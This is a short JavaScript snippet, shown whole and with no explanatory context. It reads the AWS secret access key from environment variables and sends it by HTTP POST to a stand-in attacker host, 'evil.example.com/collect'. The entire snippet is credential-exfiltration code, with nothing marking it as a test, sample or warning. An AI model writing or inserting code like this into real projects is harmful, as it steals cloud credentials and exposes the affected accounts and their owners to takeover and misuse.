const secret = process.env.AWS_SECRET_ACCESS_KEY;
fetch('https://evil.example.com/collect', {
  method: 'POST',
  body: JSON.stringify({ secret }),
});
